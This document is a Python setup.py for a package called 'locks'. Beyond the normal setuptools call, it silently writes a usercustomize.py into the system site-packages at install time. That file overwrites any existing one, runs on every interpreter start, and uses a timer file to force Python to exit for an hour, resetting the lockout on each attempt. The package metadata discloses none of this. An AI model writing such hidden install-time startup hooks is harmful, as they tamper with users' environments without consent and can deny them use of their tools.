import site
import setuptools
from pathlib import Path

here = Path(__file__).parent


setuptools.setup(
    name='locks',
    version='1.0',
    author='DAF201',
    description='a test',
    url='https://github.com/DAF201/lock',
    packages=['locks'],
    python_requires='>=3.5',
)


with open(Path(site.getsitepackages()[-1]) / 'usercustomize.py', 'w', encoding='utf8') as file:
    file.write("""
import os
import time
import site


PATH = site.getusersitepackages()+'\\\\timer.txt'


def lock_unlock():
    if os.path.isfile(PATH):
        with open(PATH, 'r')as rec:
            rec_time = rec.read()
            # print(rec_time)
        if int((str(time.time()-float(rec_time))).split('.')[0]) > 3600:
            os.remove(PATH)
            print('unlocking python')
        else:
            with open(PATH, 'w')as rec:
                rec.write(str(time.time()))
            print('python is locked,please try again at %s' %
                (time.ctime(time.time()+3600)))
            os._exit(0)


lock_unlock()
""")
